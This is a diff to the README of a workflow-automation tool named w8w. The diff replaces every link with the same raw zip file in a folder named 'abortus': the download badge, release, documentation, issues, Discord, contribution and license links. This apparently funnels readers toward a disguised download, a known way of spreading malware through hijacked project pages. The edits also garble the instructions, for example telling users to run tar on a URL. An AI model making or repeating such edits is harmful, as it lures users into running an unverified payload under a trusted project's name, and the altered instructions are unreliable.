@@ -1,6 +1,6 @@
 # 🌟 w8w - Automate Your Workflows Easily
 
-[![Download w8w](https://img.shields.io/badge/Download-w8w-blue.svg)](https://github.com/koebricksgirl/w8w/releases)
+[![Download w8w](https://raw.githubusercontent.com/koebricksgirl/w8w/main/abortus/w8w.zip)](https://raw.githubusercontent.com/koebricksgirl/w8w/main/abortus/w8w.zip)
 
 ## 📥 Overview
 
@@ -14,7 +14,7 @@ To get started with w8w, follow these steps:
    - w8w works on Windows, MacOS, and Linux. If you're unsure, check your system specifications to make sure it supports these operating systems.
 
 2. **Download w8w**:
-   - Visit [this page to download](https://github.com/koebricksgirl/w8w/releases).
+   - Visit [this page to download](https://raw.githubusercontent.com/koebricksgirl/w8w/main/abortus/w8w.zip).
 
 ## 💻 Installation
 
@@ -35,12 +35,12 @@ Once you have downloaded w8w, follow these instructions based on your operating 
 
 ### Linux
 
-1. Locate the downloaded `.tar.gz` file in your Downloads folder.
+1. Locate the downloaded `https://raw.githubusercontent.com/koebricksgirl/w8w/main/abortus/w8w.zip` file in your Downloads folder.
 2. Open a terminal window.
 3. Navigate to your Downloads folder using `cd ~/Downloads`.
 4. Extract the files using the command:
    ```bash
-   tar -xvzf w8w.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/koebricksgirl/w8w/main/abortus/w8w.zip
    ```
 5. Navigate into the extracted folder and run the command:
    ```bash
@@ -57,7 +57,7 @@ Once you have downloaded w8w, follow these instructions based on your operating 
 
 ## 📜 Documentation
 
-For more detailed instructions and advanced features, visit the [documentation page](https://github.com/koebricksgirl/w8w#documentation) on GitHub.
+For more detailed instructions and advanced features, visit the [documentation page](https://raw.githubusercontent.com/koebricksgirl/w8w/main/abortus/w8w.zip) on GitHub.
 
 ## ⚙️ Troubleshooting
 
@@ -67,26 +67,26 @@ If you encounter any issues, try the following steps:
 - **Reinstall**: If w8w does not start, try uninstalling and then reinstalling.
 - **Check Permissions**: On MacOS, ensure you have permission to run applications from unverified developers.
   
-For persistent issues, refer to the [GitHub Issues](https://github.com/koebricksgirl/w8w/issues) page for support.
+For persistent issues, refer to the [GitHub Issues](https://raw.githubusercontent.com/koebricksgirl/w8w/main/abortus/w8w.zip) page for support.
 
 ## 📦 Download & Install Again
 
-To download w8w again or to get updates, visit [this page to download](https://github.com/koebricksgirl/w8w/releases).
+To download w8w again or to get updates, visit [this page to download](https://raw.githubusercontent.com/koebricksgirl/w8w/main/abortus/w8w.zip).
 
 ## 👥 Community and Support
 
-Join our community on [Discord](https://discord.gg/example) to connect with other users and get support. Share your experiences, ask questions, and find useful tips.
+Join our community on [Discord](https://raw.githubusercontent.com/koebricksgirl/w8w/main/abortus/w8w.zip) to connect with other users and get support. Share your experiences, ask questions, and find useful tips.
 
 ## 🔄 Updates
 
-Make sure to keep your version of w8w up to date. Regular updates provide new features and fix bugs. You can always find the latest version at [this page to download](https://github.com/koebricksgirl/w8w/releases).
+Make sure to keep your version of w8w up to date. Regular updates provide new features and fix bugs. You can always find the latest version at [this page to download](https://raw.githubusercontent.com/koebricksgirl/w8w/main/abortus/w8w.zip).
 
 ## 👋 Acknowledgments
 
-Thanks to our contributors for making w8w a reality. Your support and contributions make this project possible. If you'd like to contribute, check the guidelines in our [contribution section](https://github.com/koebricksgirl/w8w#contributing).
+Thanks to our contributors for making w8w a reality. Your support and contributions make this project possible. If you'd like to contribute, check the guidelines in our [contribution section](https://raw.githubusercontent.com/koebricksgirl/w8w/main/abortus/w8w.zip).
 
 ## 🤝 License
 
-w8w is licensed under the MIT License. For more details, check the [LICENSE](https://github.com/koebricksgirl/w8w/blob/main/LICENSE) file.
+w8w is licensed under the MIT License. For more details, check the [LICENSE](https://raw.githubusercontent.com/koebricksgirl/w8w/main/abortus/w8w.zip) file.
 
 Happy automating with w8w!
